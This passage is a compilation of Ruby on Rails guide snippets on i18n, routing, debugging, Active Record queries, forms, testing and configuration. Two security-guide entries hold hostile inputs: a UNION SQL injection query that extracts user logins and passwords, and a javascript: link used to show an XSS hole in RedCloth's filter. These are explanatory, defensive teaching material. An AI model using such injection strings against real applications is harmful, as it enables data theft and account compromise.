Ruby\nDESCRIPTION: Shows how to customize I18n's translation file paths, available locales, and default locale from a Rails initializer. These settings allow for translation files to be stored outside the default config/locales directory, for explicit locale whitelisting, and for setting non-English defaults. Inputs: directory path, array of permitted locales, default locale symbol. Outputs: Altered localization behavior across the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/locale.rb\n\n# Where the I18n library should search for translation files\nI18n.load_path += Dir[Rails.root.join(\"lib\", \"locale\", \"*.{rb,yml}\")]\n\n# Permitted locales available for the application\nI18n.available_locales = [:en, :pt]\n\n# Set default locale to something other than :en\nI18n.default_locale = :pt\n```\n\n----------------------------------------\n\nTITLE: Continuing Execution After Setting catch Command\nDESCRIPTION: Shows the result of continuing execution after setting a catch breakpoint. When the ActiveRecord::RecordInvalid exception is raised, the debugger stops at the location where the exception is raised, allowing inspection of the execution context.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\n(rdbg) c    # continue command\n[75, 84] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb\n    75|     def default_validation_context\n    76|       new_record? ? :create : :update\n    77|     end\n    78|\n    79|     def raise_validation_error\n=>  80|       raise(RecordInvalid.new(self))\n    81|     end\n    82|\n    83|     def perform_validations(options = {})\n    84|       options[:validate] == false || valid?(options[:context])\n=>#0    ActiveRecord::Validations#raise_validation_error at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:80\n  #1    ActiveRecord::Validations#save!(options={}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:53\n  # and 88 frames (use `bt' command for all frames)\n\nStop by #1  BP - Catch  \"ActiveRecord::RecordInvalid\"\n```\n\n----------------------------------------\n\nTITLE: Defining Deeply Nested Resources in Rails\nDESCRIPTION: This snippet demonstrates deeply nested resources in Rails. It's generally recommended to avoid nesting more than one level deep due to complexity.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nresources :publishers do\n  resources :magazines do\n    resources :photos\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a Rails 4.0 Application Using Edge Version\nDESCRIPTION: Command to create a Rails application using the latest code from the Rails Git repository by using the --edge flag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_0_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new myapp --edge\n```\n\n----------------------------------------\n\nTITLE: Defining Resource Routes for Magazines and Ads - Ruby\nDESCRIPTION: This snippet defines nested resource routes for `magazines` and `ads`. It creates standard RESTful routes for both resources, allowing access to actions like index, show, create, update, and destroy.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nresources :magazines do\n  resources :ads\nend\n```\n\n----------------------------------------\n\nTITLE: Chaining Where Clauses Without Rewriting (Ruby)\nDESCRIPTION: This snippet shows how `where` clauses are ANDed together when `rewhere` is not used to override the condition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_123\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(out_of_print: true).where(out_of_print: false)\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - singular (IRB)\nDESCRIPTION: Demonstrates the `singular` method of `model_name` from `ActiveModel::Naming`. It returns the singular class name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_24\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.singular\n=> \"person\"\n```\n\n----------------------------------------\n\nTITLE: Shallow Nesting with :shallow_prefix\nDESCRIPTION: This snippet shows how to use the `:shallow_prefix` option in a `scope` to customize the route helper names for shallow routes.  The specified prefix (\"sekret\") is added to the generated route helper names (e.g., `sekret_comment_path` instead of `comment_path`), allowing you to avoid naming conflicts and organize your route helpers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nscope shallow_prefix: \"sekret\" do\n  resources :articles do\n    resources :comments, shallow: true\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Updated assert_select Entity Handling\nDESCRIPTION: Illustrates changes in how assert_select handles HTML entities in content comparison.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# content: <p>AT&amp;T</p>\n\n# before:\nassert_select('p', 'AT&amp;T')  # => true\nassert_select('p', 'AT&T')      # => false\n\n# now:\nassert_select('p', 'AT&T')      # => true\nassert_select('p', 'AT&amp;T')  # => false\n```\n\n----------------------------------------\n\nTITLE: Configuring Session Domain - Ruby\nDESCRIPTION: This code snippet demonstrates setting the domain for the session cookie.  The `:domain` key specifies the domain name, allowing the cookie to be shared across subdomains. This is useful for applications with multiple subdomains.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.session_store :cookie_store, key: \"_your_app_session\", domain: \".example.com\"\n```\n\n----------------------------------------\n\nTITLE: TypeScript Transpilation Example\nDESCRIPTION: Example of TypeScript code before transpilation, showing type annotations that will be converted to plain JavaScript. This demonstrates how transpilation converts code from one language/format to another.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_22\n\nLANGUAGE: typescript\nCODE:\n```\nconst greet = (name: string): void => {\n  console.log(`Hello, ${name}!`);\n};\n```\n\n----------------------------------------\n\nTITLE: Using form_with with ActiveModel::API Object\nDESCRIPTION: This snippet shows how to use `form_with` helper in Rails to create a form for an `EmailContact` object. It demonstrates how `form_with` interacts with objects that include `ActiveModel::API`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<%= form_with model: EmailContact.new do |form| %>\n  <%= form.text_field :name %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Database System Change Command\nDESCRIPTION: Example of switching database systems in a Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\n$ rails db:system:change --to=postgresql\n    conflict  config/database.yml\nOverwrite config/database.yml? (enter \"h\" for help) [Ynaqdhm] Y\n       force  config/database.yml\n        gsub  Gemfile\n        gsub  Gemfile\n...\n```\n\n----------------------------------------\n\nTITLE: UNION-based SQL Injection Result\nDESCRIPTION: Example of how a UNION-based SQL injection attack can be used to extract unauthorized data from a different table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_34\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM projects WHERE (name = '') UNION\n  SELECT id,login AS name,password AS description,1,1,1 FROM users --'\n```\n\n----------------------------------------\n\nTITLE: MIME Type Handling with Operator Overloading\nDESCRIPTION: Demonstrates the new =~ operator implementation for MIME::Type, allowing easier checking of content types with synonyms.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nif content_type && Mime::JS =~ content_type\n  # do something cool\nend\n\nMime::JS =~ \"text/javascript\"        => true\nMime::JS =~ \"application/javascript\" => true\n```\n\n----------------------------------------\n\nTITLE: Configuring Mailgun Ingress in Rails\nDESCRIPTION: This Ruby code configures Action Mailbox to accept emails from Mailgun. This setting should be placed within the application's production environment configuration to enable Mailgun ingress.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.action_mailbox.ingress = :mailgun\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Distinct Value Selection in Rails\nDESCRIPTION: This SQL query shows the `DISTINCT` keyword, which is used to retrieve only unique values from the `last_name` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_87\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DISTINCT last_name FROM customers\n```\n\n----------------------------------------\n\nTITLE: Committing Changes in Git for Rails Development\nDESCRIPTION: This bash snippet demonstrates how to commit changes to Git when contributing to Rails. It shows the command to initiate a commit and mentions the importance of writing a well-formatted commit message.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_39\n\nLANGUAGE: bash\nCODE:\n```\n$ git commit -a\n```\n\n----------------------------------------\n\nTITLE: Rails Functional Controller Test Ruby\nDESCRIPTION: Illustrates a basic functional controller test in Rails, checking if the request on the 'index' action is successful. The test retrieves the 'index' page and asserts a successful response.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\n# articles_controller_test.rb\nclass ArticlesControllerTest < ActionDispatch::IntegrationTest\n  test \"should get index\" do\n    get articles_url\n    assert_response :success\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Failing Model Test (Ruby)\nDESCRIPTION: This test case attempts to save an `Article` without a `title`.  It asserts that the save operation should fail (return false). This tests the model's validations or lack thereof. `assert_not` checks for a false or nil return value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_7\n\nLANGUAGE: Ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ArticleTest < ActiveSupport::TestCase\n  test \"should not save article without title\" do\n    article = Article.new\n    assert_not article.save\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring SQLite3 Database for JRuby (YAML)\nDESCRIPTION: This YAML snippet configures an SQLite3 database for the development environment using JRuby. It specifies the `jdbcsqlite3` adapter and the database file path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_93\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: jdbcsqlite3\n  database: storage/development.sqlite3\n```\n\n----------------------------------------\n\nTITLE: Configuring Production Environment for Rails 3.1\nDESCRIPTION: This snippet shows the configuration settings for the production environment in Rails 3.1, including asset pipeline and SSL settings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_106\n\nLANGUAGE: ruby\nCODE:\n```\n# Compress JavaScripts and CSS\nconfig.assets.compress = true\n\n# Don't fallback to assets pipeline if a precompiled asset is missed\nconfig.assets.compile = false\n\n# Generate digests for assets URLs\nconfig.assets.digest = true\n\n# Defaults to Rails.root.join(\"public/assets\")\n# config.assets.manifest = YOUR_PATH\n\n# Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)\n# config.assets.precompile += %w( admin.js admin.css )\n\n# Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies.\n# config.force_ssl = true\n```\n\n----------------------------------------\n\nTITLE: Ordering Records in Rails\nDESCRIPTION: Illustrates basic ordering of records by a single field, in ascending order.  Shows both symbol and string syntax.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_79\n\nLANGUAGE: ruby\nCODE:\n```\nBook.order(:created_at)\n# OR\nBook.order(\"created_at\")\n```\n\n----------------------------------------\n\nTITLE: Listing Bundler Rake Tasks for Ruby Gem Development\nDESCRIPTION: This bash command demonstrates how to list available Bundler Rake tasks for gem development, including building, installing, and releasing the gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_28\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake -T\n\n$ bundle exec rake build\n# Build yaffle-0.1.0.gem into the pkg directory\n\n$ bundle exec rake install\n# Build and install yaffle-0.1.0.gem into system gems\n\n$ bundle exec rake release\n# Create tag v0.1.0 and build and push yaffle-0.1.0.gem to Rubygems\n```\n\n----------------------------------------\n\nTITLE: Generated Radio Buttons HTML - HTML\nDESCRIPTION: This is the HTML code generated by the radio buttons defined in the previous ERB snippet. Each radio button has the same name ('flavor') but different values to allow the user to select only one option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"radio\" value=\"chocolate_chip\" name=\"flavor\" id=\"flavor_chocolate_chip\">\n<label for=\"flavor_chocolate_chip\">Chocolate Chip</label>\n<input type=\"radio\" value=\"vanilla\" name=\"flavor\" id=\"flavor_vanilla\">\n<label for=\"flavor_vanilla\">Vanilla</label>\n<input type=\"radio\" value=\"hazelnut\" name=\"flavor\" id=\"flavor_hazelnut\">\n<label for=\"flavor_hazelnut\">Hazelnut</label>\n```\n\n----------------------------------------\n\nTITLE: Including ActionText::Attachable in a Model\nDESCRIPTION: This snippet shows how to include the `ActionText::Attachable` module in a Rails model.  This module provides the `#to_sgid(**options)` method, enabling the model to be referenced as an attachment within Action Text. It also shows how the attachment is resolved and accessed via `content.attachables`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  include ActionText::Attachable\nend\n\nperson = Person.create! name: \"Javan\"\nhtml = %Q(<action-text-attachment sgid=\"#{person.attachable_sgid}\"></action-text-attachment>)\ncontent = ActionText::Content.new(html)\ncontent.attachables # => [person]\n```\n\n----------------------------------------\n\nTITLE: Using catch Command with Ruby Debugger\nDESCRIPTION: Demonstrates how to use the 'catch' command in Ruby debugger to stop execution when a specific exception (ActiveRecord::RecordInvalid) is raised. The command sets a breakpoint that will activate when the specified exception is raised during program execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\n[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb\n    20|   end\n    21|\n    22|   # POST /posts or /posts.json\n    23|   def create\n    24|     @post = Post.new(post_params)\n=>  25|     debugger\n    26|\n    27|     respond_to do |format|\n    28|       if @post.save!\n    29|         format.html { redirect_to @post, notice: \"Post was successfully created.\" }\n=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25\n  #1    ActionController::BasicImplicitRender#send_action(method=\"create\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6\n  # and 72 frames (use `bt' command for all frames)\n(rdbg) catch ActiveRecord::RecordInvalid    # command\n#1  BP - Catch  \"ActiveRecord::RecordInvalid\"\n```\n\n----------------------------------------\n\nTITLE: HTML output of form with button method overrides\nDESCRIPTION: This HTML code illustrates how Rails renders form buttons with overridden methods (DELETE) by including a hidden `_method` input for the form's overall method (PATCH) and a separate `_method` input on the 'Delete' button to override the request to DELETE. The 'Update' button, without a `formmethod` attribute, triggers the form's default PATCH method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_30\n\nLANGUAGE: html\nCODE:\n```\n<form accept-charset=\"UTF-8\" action=\"/posts/1\" method=\"post\">\n  <input name=\"_method\" type=\"hidden\" value=\"patch\" />\n  <input name=\"authenticity_token\" type=\"hidden\" value=\"f755bb0ed134b76c432144748a6d4b7a7ddf2b71\" />\n  <!-- ... -->\n\n  <button type=\"submit\" formmethod=\"post\" name=\"_method\" value=\"delete\" data-confirm=\"Are you sure?\">Delete</button>\n  <button type=\"submit\" name=\"button\">Update</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Checkbox Tag Helper\nDESCRIPTION: This is the HTML output generated by the `checkbox_tag` helper in the previous example.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_90\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"checkbox\" name=\"accept\" id=\"accept\" value=\"1\" />\n```\n\n----------------------------------------\n\nTITLE: Delegating missing methods to another object Ruby\nDESCRIPTION: This code shows how to use `delegate_missing_to` to delegate any missing methods to another object. This is useful for providing a fallback mechanism or extending the functionality of an object through delegation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one :profile\n\n  delegate_missing_to :profile\nend\n```\n\n----------------------------------------\n\nTITLE: Running Tests Within a Specific Line Range in Bash (Railties)\nDESCRIPTION: Executes tests within a specific file (`test/application/asset_debugging_test.rb`) that are defined between the specified starting and ending line numbers (69 to 100, inclusive). Useful for running a group of related tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_18\n\nLANGUAGE: bash\nCODE:\n```\n$ cd railties\n$ bin/test test/application/asset_debugging_test.rb:69-100\n```\n\n----------------------------------------\n\nTITLE: Using Inline Code in Headings - Markdown\nDESCRIPTION: Guides writers to use inline formatting (backticks) for code elements directly within headings, ensuring clarity and consistency in documentation. No external dependencies; recommended for documenting parameter names or code symbols.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n##### The `:content_type` Option\n```\n\n----------------------------------------\n\nTITLE: Attaching File with Disabled Content Type Inference in Rails\nDESCRIPTION: Shows how to attach a file while disabling Active Storage's automatic content type inference by setting identify to false. This example explicitly sets the content type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\n@message.images.attach(\n  io: File.open(\"/path/to/file\"),\n  filename: \"file.pdf\",\n  content_type: \"application/pdf\",\n  identify: false\n)\n```\n\n----------------------------------------\n\nTITLE: Ruby Configuration Setting for Regexp Timeout\nDESCRIPTION: Sets a default timeout of 1 second for regular expressions to prevent Regexp Denial-of-Service attacks\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/8_0_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\nRegexp.timeout = 1\n```\n\n----------------------------------------\n\nTITLE: Resolve Route Example in Rails\nDESCRIPTION: This code demonstrates customizing polymorphic mapping of models using the `resolve` method in Rails routing. It changes the URL generated for a `Basket` resource from `/baskets/:id` to the singular `/basket`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nresource :basket\n\nresolve(\"Basket\") { [:basket] }\n```\n\nLANGUAGE: ruby\nCODE:\n```\n<%= form_with model: @basket do |form| %>\n  <!-- basket form -->\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Missing Attachment Partial ERB Template\nDESCRIPTION: This snippet showcases a partial rendered when Action Text can't resolve an attachment instance. In this case, it displays the text \"Deleted user\".\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_17\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/users/missing_attachable.html.erb %>\n<span>Deleted user</span>\n```\n\n----------------------------------------\n\nTITLE: Using Multiline Option with Regular Expressions in Rails Validation\nDESCRIPTION: Example of how to use the multiline option when ^ and $ are needed for line-based matching rather than string boundaries. This validates that content includes a specific line anywhere in the string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\n# content should include a line \"Meanwhile\" anywhere in the string\nvalidates :content, format: { with: /^Meanwhile$/, multiline: true }\n```\n\n----------------------------------------\n\nTITLE: Iterating over a large set of records\nDESCRIPTION: This code illustrates a naive approach to iterating over a large set of records that could lead to excessive memory consumption. It fetches the entire table into memory before processing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n# This may consume too much memory if the table is big.\nCustomer.all.each do |customer|\n  NewsMailer.weekly(customer).deliver_now\nend\n```\n\n----------------------------------------\n\nTITLE: YAML Configuration with Shared Configuration\nDESCRIPTION: This snippet shows a YAML configuration file that uses a shared configuration. The `shared` configuration is merged into the environment-specific configurations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_117\n\nLANGUAGE: yaml\nCODE:\n```\n# config/example.yml\nshared:\n  foo:\n    bar:\n      baz: 1\n\ndevelopment:\n  foo:\n    bar:\n      qux: 2\n```\n\n----------------------------------------\n\nTITLE: RedCloth link filter limitation example\nDESCRIPTION: A Ruby example demonstrating that RedCloth's HTML filtering still allows certain tags like <a>, which can be exploited for XSS. This shows the limitations of the built-in filter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nRedCloth.new(\"<a href='javascript:alert(1)'>hello</a>\", [:filter_html]).to_html\n# => \"<p><a href=\\\"javascript:alert(1)\\\">hello</a></p>\"\n```\n\n----------------------------------------\n\nTITLE: Rollback multiple migrations\nDESCRIPTION: Shows how to rollback a specified number of migrations using the `db:rollback` command with the `STEP` parameter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_65\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:rollback STEP=3\n```\n\n----------------------------------------\n\nTITLE: Creating Rakefiles with rakefile\nDESCRIPTION: Demonstrates how to create a new rake file under `lib/tasks` with custom tasks using the `rakefile` method. The example creates a rake task within a namespace.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nrakefile(\"bootstrap.rake\") do\n  <<-TASK\n    namespace :boot do\n      task :strap do\n        puts \"i like boots!\"\n      end\n    end\n  TASK\nend\n```\n\n----------------------------------------\n\nTITLE: Adding and removing foreign keys in Ruby on Rails migrations\nDESCRIPTION: These snippets show how to add and remove foreign keys using the migration DSL in Rails 4.2. It includes examples of basic foreign key creation, custom column and primary key specification, and different ways to remove foreign keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# add a foreign key to `articles.author_id` referencing `authors.id`\nadd_foreign_key :articles, :authors\n\n# add a foreign key to `articles.author_id` referencing `users.lng_id`\nadd_foreign_key :articles, :users, column: :author_id, primary_key: \"lng_id\"\n\n# remove the foreign key on `accounts.branch_id`\nremove_foreign_key :accounts, :branches\n\n# remove the foreign key on `accounts.owner_id`\nremove_foreign_key :accounts, column: :owner_id\n```\n\n----------------------------------------\n\nTITLE: Requiring acts_as_yaffle in Yaffle Plugin - Ruby\nDESCRIPTION: Amends the plugin entry point to require the newly implemented 'acts_as_yaffle' feature module. Ensures that extension is loaded and available in all contexts where the plugin is active. Dependencies required are yaffle/version, yaffle/railtie, yaffle/core_ext, and yaffle/acts_as_yaffle.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/lib/yaffle.rb\n\nrequire \"yaffle/version\"\nrequire \"yaffle/railtie\"\nrequire \"yaffle/core_ext\"\nrequire \"yaffle/acts_as_yaffle\"\n\nmodule Yaffle\n  # Your code goes here...\nend\n```\n\n----------------------------------------\n\nTITLE: Action Text Attachment HTML Element\nDESCRIPTION: This snippet demonstrates the HTML structure of an Action Text attachment element.  It contains an `sgid` attribute which is a Signed Global ID used to resolve the attached model instance.  Action Text uses this `sgid` to render the appropriate content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<action-text-attachment sgid=\"BAh7CEkiCG…\"></action-text-attachment>\n```\n\n----------------------------------------\n\nTITLE: Nested Layout (news.html.erb)\nDESCRIPTION: This snippet demonstrates a nested layout for the `NewsController`. It hides the top menu defined in the application layout, adds a right menu, and then renders the application layout, effectively nesting the `news` layout within the `application` layout.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_97\n\nLANGUAGE: html+erb\nCODE:\n```\n<% content_for :head do %>\n  <style>\n    #top_menu {display: none}\n    #right_menu {float: right; background-color: yellow; color: black}\n  </style>\n<% end %>\n<% content_for :content do %>\n  <div id=\"right_menu\">Right menu items here</div>\n  <%= content_for?(:news_content) ? yield(:news_content) : yield %>\n<% end %>\n<%= render template: \"layouts/application\" %>\n```\n\n----------------------------------------\n\nTITLE: Defining App Method in Rackup::Server (Ruby)\nDESCRIPTION: This snippet shows the implementation of the `app` method in the Rackup::Server class. It builds the Rails application either from a string or from a configuration file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_18\n\nLANGUAGE: Ruby\nCODE:\n```\nmodule Rackup\n  class Server\n    def app\n      @app ||= options[:builder] ? build_app_from_string : build_app_and_options_from_config\n    end\n\n    # ...\n\n    private\n      def build_app_and_options_from_config\n        if !::File.exist? options[:config]\n          abort \"configuration #{options[:config]} not found\"\n        end\n\n        Rack::Builder.parse_file(self.options[:config])\n      end\n\n      def build_app_from_string\n        Rack::Builder.new_from_string(self.options[:builder])\n      end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: External Stylesheet Include (Rails/ERB)\nDESCRIPTION: This example demonstrates including a CSS file from an external URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_50\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"http://example.com/main.css\" %>\n```\n\n----------------------------------------\n\nTITLE: Using raw helper for verbatim insertion\nDESCRIPTION: This Ruby code defines the raw helper method, which takes a string-like object, converts it to a string, and marks it as HTML safe. This is useful for inserting content verbatim into HTML templates without escaping.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\ndef raw(stringish)\n  stringish.to_s.html_safe\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Image Variants for Attachments in Rails\nDESCRIPTION: Demonstrates how to configure specific image variants for attachments by using a block with the has_many_attached declaration. This example creates a thumbnail variant limited to 100x100 pixels.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nclass Message < ApplicationRecord\n  has_many_attached :images do |attachable|\n    attachable.variant :thumb, resize_to_limit: [100, 100]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Including Active Storage with Asset Pipeline\nDESCRIPTION: Shows how to include Active Storage JavaScript using the Rails asset pipeline require directive.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_63\n\nLANGUAGE: js\nCODE:\n```\n//= require activestorage\n```\n\n----------------------------------------\n\nTITLE: Running a Specific Test (Bash)\nDESCRIPTION: This command runs a specific test file (`test/models/article_test.rb`) in the Rails application. This allows focusing on individual tests or test suites during development.  The `:6` specifies that only line 6 of the test file will be executed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/models/article_test.rb:6\n```\n\n----------------------------------------\n\nTITLE: Using Module#concerning\nDESCRIPTION: Example of using Module#concerning for organizing class responsibilities.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass Todo < ActiveRecord::Base\n  concerning :EventTracking do\n    included do\n      has_many :events\n    end\n\n    def latest_event\n      # ...\n    end\n\n    private\n      def some_internal_method\n        # ...\n      end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Basic has_many through Association Setup in ActiveRecord\nDESCRIPTION: Demonstrates a basic setup for a has_many through association where a Person has many Articles through Readings, which sets the stage for showing the distinct option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_128\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  has_many :readings\n  has_many :articles, through: :readings\nend\n```\n\n----------------------------------------\n\nTITLE: Running EXPLAIN on a Relation in Rails\nDESCRIPTION: This snippet demonstrates how to use the `explain` method in Rails to analyze the query plan for a given Active Record relation. It shows how to construct a query using `where` and `joins` and then call `explain` to generate the query plan.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_209\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(id: 1).joins(:orders).explain\n```\n\n----------------------------------------\n\nTITLE: Supporting SHA-1 for Non-Deterministic Encryption in Rails 7.1\nDESCRIPTION: Configuration example showing how to enable support for SHA-1 in non-deterministic encryption when migrating to Rails 7.1, which helps with backwards compatibility for previously encrypted data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.support_sha1_for_non_deterministic_encryption = true\n```\n\n----------------------------------------\n\nTITLE: Defining an Active Record Migration in Ruby\nDESCRIPTION: Shows a Rails migration class `CreatePublications` inheriting from `ActiveRecord::Migration`. The `change` method defines the database schema modifications, in this case, creating a new table named `publications` with specified columns (string, text, references including polymorphic, boolean, timestamps). This DSL is database-agnostic.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreatePublications < 